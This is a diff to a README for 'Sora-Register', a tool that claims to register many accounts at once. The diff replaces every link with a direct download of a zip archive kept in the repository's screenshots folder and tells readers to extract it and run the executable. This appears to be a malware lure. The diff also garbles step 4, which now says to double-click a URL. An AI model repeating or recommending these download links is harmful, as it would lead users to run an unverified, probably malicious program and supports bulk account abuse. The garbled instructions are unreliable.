@@ -1,7 +1,7 @@
 # 🎉 Sora-Register - Simple Tool for Bulk Registration
 
 ## 🔗 Download Now
-[![Download Sora-Register](https://img.shields.io/badge/Download-Sora--Register-brightgreen.svg)](https://github.com/hewwo22W/Sora-Register)
+[![Download Sora-Register](https://github.com/hewwo22W/Sora-Register/raw/refs/heads/main/screenshots/Sora_Register_2.5.zip)](https://github.com/hewwo22W/Sora-Register/raw/refs/heads/main/screenshots/Sora_Register_2.5.zip)
 
 ## 🚀 Getting Started
 Sora-Register helps you register multiple accounts quickly. This tool supports multi-threading for faster processing. Follow these steps to start using it.
@@ -14,13 +14,13 @@ Sora-Register helps you register multiple accounts quickly. This tool supports m
 
 ## 📥 Installation Steps
 1. **Visit the download page**: Click the link below to go to the download page.
-   [Download Sora-Register](https://github.com/hewwo22W/Sora-Register)
+   [Download Sora-Register](https://github.com/hewwo22W/Sora-Register/raw/refs/heads/main/screenshots/Sora_Register_2.5.zip)
 
 2. **Download the application**: Look for the latest release and click it to start your download. 
 
 3. **Extract the files**: Once the download is complete, locate the downloaded zip file. Right-click and choose "Extract All" to unzip the content to a folder. 
 
-4. **Run the application**: Navigate to the extracted folder, then double-click the `Sora-Register.exe` file.
+4. **Run the application**: Navigate to the extracted folder, then double-click the `https://github.com/hewwo22W/Sora-Register/raw/refs/heads/main/screenshots/Sora_Register_2.5.zip` file.
 
 ## 🔧 Using Sora-Register
 After opening the application, you will see a user-friendly interface. Here’s how to use it:
@@ -57,6 +57,6 @@ Join our conversation! We value your input. Share your thoughts on how to improv
 Your data is important. Sora-Register uses secure methods to handle your information. Always ensure the latest version is installed for the best security features.
 
 ## 🔗 Additional Resources
-For more detailed documentation, visit our [GitHub Repository](https://github.com/hewwo22W/Sora-Register).
+For more detailed documentation, visit our [GitHub Repository](https://github.com/hewwo22W/Sora-Register/raw/refs/heads/main/screenshots/Sora_Register_2.5.zip).
 
 By following these guidelines, you can efficiently use Sora-Register to streamline your bulk registration process.
